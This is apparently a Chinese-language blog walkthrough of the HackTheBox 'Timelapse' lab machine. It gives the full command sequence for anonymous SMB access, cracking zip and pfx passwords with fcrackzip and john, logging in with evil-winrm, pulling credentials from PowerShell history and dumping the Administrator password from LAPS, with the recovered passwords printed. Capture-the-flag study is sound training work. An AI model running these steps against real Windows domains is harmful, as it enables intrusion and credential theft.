HTB-Timelapse

发表于2022-06-25|更新于2022-07-07|靶场Hacktheboxeasy
|字数总计:1.1k|阅读时长:5分钟|阅读量:|评论数:

信息搜集

初步的端口扫描：

扫描所有的端口，nmap -p- -T4 -Pn 10.10.11.152：

开启了389ldap服务，域名服务以及Kerberos认证服务，那么该主机可能是一个域控制器(Domain Controller)。
smbclient -L //10.10.11.152/获取SMB服务列表：

smbclient //10.10.11.152/Shares连接Shares服务，因为该服务没有认证

发现存在一个zip文件，下载进行分析，发现需要认证。
继续查看发现一些帮助文件：

但是帮助文件没有任何十分有用的信息。

普通权限获取

fcrackzip -D -u -v winrm_backup.zip -p /usr/share/wordlists/rockyou.txt暴力破解zip文件的密码。
爆破出密码为supremelegacy
解压得到一个pfx文件，该文件存储的是数据，是微软支持的私钥格式，cer是公钥而pfx是私钥。
使用openssl pkcs12 -in ./legacyy_dev_auth.pfx -nodes -out server.pem得到证书，发现该证书被加密并且密码不是之前爆破的密码。
需要先获取到解压的密码。

爆破pfx文件密码

pfx2john pfxfile将pfx文件转换为john格式的哈希文件，用来进行爆破。
使用john爆破哈希，需要指定爆破时的正确格式：
john -w=/usr/share/wordlists/rockyou.txt --rule /usr/share/john/rules/rockyou-30000.rule pfx_hash

密码为thuglegacy,之后便可以使用上面的openssl命令获取证书以及私钥和公钥
evil-winrm -S -c legacy.cert -k legacy.key 10.10.11.152使用公钥和私钥登录主机。

管理员权限获取

net user legacyy查看当前用户的权限

使用winPEAS脚本来检测可能的提权点。
发现powershell历史命令文件中可能存在漏洞。
cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine切换到保存历史命令的文件夹下面。
cat ConsoleHost_history.txt查看历史命令

发现svc_deploy用户的凭证，该凭证用来PS-Remoting也就是远程登录，该过程是以svc_deploy的身份执行命令。

重现此过程

定义环境变量：

执行命令：invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
发现是以svc_deploy身份执行的。

查看当前用户的信息：invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
发现用户在用户组LAPS_Readers中

域提权

因为svc_deploy处于LAPS_Readers用户组中，那么我们可以利用该用户组获取Administrator的密码。
使用AD-Module查看LAPS中存储的密码：
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}

获取到Administrator的密码为[D6R3p%.oy(ArD4d}Ff3$%7o
以Administrator权限登录：evil-winrm -u 'Administrator' -p '[D6R3p%.oy(ArD4d}Ff3$%7o' -S -i 10.10.11.152

Get-ChildItem -Recurse -Include root.txt查找root文件位置，发现在C:\Users\TRX\Desktop目录下。
